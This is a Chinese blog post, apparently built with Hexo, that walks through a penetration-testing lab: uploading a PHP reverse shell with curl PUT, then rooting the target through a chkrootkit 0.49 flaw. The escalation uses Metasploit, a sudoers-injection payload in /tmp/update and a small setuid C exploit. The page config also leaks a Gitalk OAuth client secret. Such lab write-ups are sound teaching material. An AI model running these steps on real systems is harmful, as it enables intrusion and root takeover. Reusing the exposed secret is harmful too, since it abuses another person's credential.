@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/images/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"got17.cn","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.13.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":true,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="51CTO的网课，本篇利用nmap搜索开放端口，nikto、dirb挖掘敏感目录找到一个文件目录界面，curl测试发现开放PUT权限，上传反弹shell获得低权用户的shell，审计代码查询定时任务，发现chkrootkit的0.49版本存在漏洞，使用metasploit结合刚才获得的shell提权攻击，获得root权限。另外还有两种网上查到的提权方法一并展示，不得不说攻击的手段真是层出不穷，方法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【网络安全0x0e】PUT上传漏洞">
+<meta property="og:url" content="http://got17.cn/1065/index.html">
+<meta property="og:site_name" content="gaoteng&#39;s blog">
+<meta property="og:description" content="51CTO的网课，本篇利用nmap搜索开放端口，nikto、dirb挖掘敏感目录找到一个文件目录界面，curl测试发现开放PUT权限，上传反弹shell获得低权用户的shell，审计代码查询定时任务，发现chkrootkit的0.49版本存在漏洞，使用metasploit结合刚才获得的shell提权攻击，获得root权限。另外还有两种网上查到的提权方法一并展示，不得不说攻击的手段真是层出不穷，方法">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://got17.cn/1065/1.PNG">
+<meta property="og:image" content="http://got17.cn/1065/2.PNG">
+<meta property="og:image" content="http://got17.cn/1065/3.PNG">
+<meta property="og:image" content="http://got17.cn/1065/4.PNG">
+<meta property="og:image" content="http://got17.cn/1065/6.PNG">
+<meta property="og:image" content="http://got17.cn/1065/5.PNG">
+<meta property="og:image" content="http://got17.cn/1065/7.PNG">
+<meta property="og:image" content="http://got17.cn/1065/8.PNG">
+<meta property="og:image" content="http://got17.cn/1065/9.PNG">
+<meta property="og:image" content="http://got17.cn/1065/10.PNG">
+<meta property="article:published_time" content="2020-06-21T14:13:08.000Z">
+<meta property="article:modified_time" content="2022-09-03T03:28:56.609Z">
+<meta property="article:author" content="gaoteng17">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="metasploit">
+<meta property="article:tag" content="curl">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://got17.cn/1065/1.PNG">
+
+
+<link rel="canonical" href="http://got17.cn/1065/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://got17.cn/1065/","path":"1065/","title":"【网络安全0x0e】PUT上传漏洞"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>【网络安全0x0e】PUT上传漏洞 | gaoteng's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">gaoteng's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">1.</span> <span class="nav-text">使用命令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#curl"><span class="nav-number">1.1.</span> <span class="nav-text">curl</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95"><span class="nav-number">2.</span> <span class="nav-text">渗透记录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">3.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="gaoteng17"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">gaoteng17</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">82</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/gaoteng17" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;gaoteng17" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:gaoteng17@gmail.com" title="E-Mail → mailto:gaoteng17@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/5544866728" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5544866728" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://got17.cn/1065/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="gaoteng17">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gaoteng's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="【网络安全0x0e】PUT上传漏洞 | gaoteng's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【网络安全0x0e】PUT上传漏洞
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-06-21 22:13:08" itemprop="dateCreated datePublished" datetime="2020-06-21T22:13:08+08:00">2020-06-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-09-03 11:28:56" itemprop="dateModified" datetime="2022-09-03T11:28:56+08:00">2022-09-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>51CTO的网课，本篇利用nmap搜索开放端口，nikto、dirb挖掘敏感目录找到一个文件目录界面，curl测试发现开放PUT权限，上传反弹shell获得低权用户的shell，审计代码查询定时任务，发现chkrootkit的0.49版本存在漏洞，使用metasploit结合刚才获得的shell提权攻击，获得root权限。另外还有两种网上查到的提权方法一并展示，不得不说攻击的手段真是层出不穷，方法真是五花八门。</p>
+<p>本篇使用工具curl，metasploit。</p>
+<span id="more"></span>
+
+<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#测试url允许的post参数</span></span><br><span class="line">curl -v -X OPTIONS [url]</span><br><span class="line"></span><br><span class="line"><span class="comment">#PUT上传</span></span><br><span class="line">curl -v -T [file] [url]</span><br></pre></td></tr></table></figure>
+
+<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
+<li>nmap扫描靶机IP地址开放端口，<code>80</code>口有web服务，<code>dirb</code>挖掘<code>80</code>端口web信息，找到一个测试界面，打开是文件目录：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.2.149</span><br><span class="line">dirb http://192.168.2.149</span><br></pre></td></tr></table></figure>
+
+<p><img src="/1065/1.PNG"></p>
+<ol start="2">
+<li>curl测试网站支持参数，发现可以利用PUT上传反弹shell：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -X OPTIONS http://192.168.2.149/test/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/1065/2.PNG"></p>
+<ol start="3">
+<li>生成反弹shell并上传，这里必须加<code>-H</code>自定义头为**Expect:**，否则靶机<code>lighttpd/1.4.28</code>这个版本会返回417错误上传失败：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -H <span class="string">&quot;Expect:&quot;</span> -T Desktop/shells/php_reverse_shell.php http://192.168.2.149/test/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/1065/3.PNG"></p>
+<ol start="4">
+<li>开启监听，在靶机执行反弹shell，结果没有弹回来，应该是防火墙拦截了：</li>
+</ol>
+<p><img src="/1065/4.PNG"></p>
+<ol start="5">
+<li>修改监听端口为<code>443</code>，成功绕过防火墙拿到低权shell，这里中途换了metasploit监听（对应shell需要msfvenom生成），方便下一步的提权：</li>
+</ol>
+<p><img src="/1065/6.PNG"></p>
+<p><img src="/1065/5.PNG"></p>
+<ol start="6">
+<li>一顿狂扫，按版本搜漏洞，最后系统版本无漏洞，内核版本无漏洞，chkrootkit(一个检测恶意软件Rootkit的脚本)版本存在漏洞：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkrootkit -V</span><br></pre></td></tr></table></figure>
+
+<p><img src="/1065/7.PNG"></p>
+<ol start="7">
+<li>metasploit使用对应漏洞，结合刚才的shell，提权root：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">&gt;use exploit/unix/local/chkrootkit</span><br><span class="line">&gt;<span class="built_in">set</span> payload cmd/unix/reverse</span><br><span class="line">&gt;<span class="built_in">set</span> session 2</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/1065/8.PNG"></p>
+<ol start="8">
+<li>成功本地提权，这个利用的是创建<code>/tmp</code>下的<strong>update</strong>文件欺骗<strong>chkrootkit</strong>更新以执行提权：</li>
+</ol>
+<p><img src="/1065/9.PNG"></p>
+<ol start="9">
+<li>既然了解了原理，我们也可以手动操作，切到<code>/tmp</code>目录下新建<strong>update</strong>文件，echo进去一段代码将当前用户写入sudo组：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> /tmp/update</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/update</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL)NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span> &gt; /tmp/update</span><br></pre></td></tr></table></figure>
+
+<p><img src="/1065/10.PNG"></p>
+<ol start="10">
+<li>还有一种方法是编写exp，原理差不多，改变&#x2F;tmp的所属组为root以及增加uid为root权限，不过涉及到编译，操作多一点，万一靶机gcc不好使就没办法了：</li>
+</ol>
+<ul>
+<li>exp脚本如下：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"> system(<span class="string">&quot;chown root;root /tmp/update&quot;</span>);</span><br><span class="line"> system(<span class="string">&quot;chmod 4755 /tmp/update&quot;</span>);</span><br><span class="line"> setuid(<span class="number">0</span>);</span><br><span class="line"> setgid(<span class="number">0</span>);</span><br><span class="line"> execl(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;sh&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>编译：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc update.c -o update</span><br><span class="line">./update</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/10854392.html">kali渗透综合靶机(十二)–SickOs1.2靶机</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
+              <a href="/tags/metasploit/" rel="tag"># metasploit</a>
+              <a href="/tags/curl/" rel="tag"># curl</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/1064/" rel="prev" title="【网络安全0x0d】命令执行漏洞（集成工具）">
+                  <i class="fa fa-chevron-left"></i> 【网络安全0x0d】命令执行漏洞（集成工具）
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/1066/" rel="next" title="【网络安全0x0f】命令注入漏洞">
+                  【网络安全0x0f】命令注入漏洞 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa-solid fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">gaoteng17</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"client_id":"96531982aa814e82e033","client_secret":"9d64fd0a7523408d110bfc9839658aaa2a0ee62e","repo":"Blog_Comments","github_id":"gaoteng17","admin_user":"gaoteng17","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"6fff6ad4b14570e148f16cae7b8c4e65"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
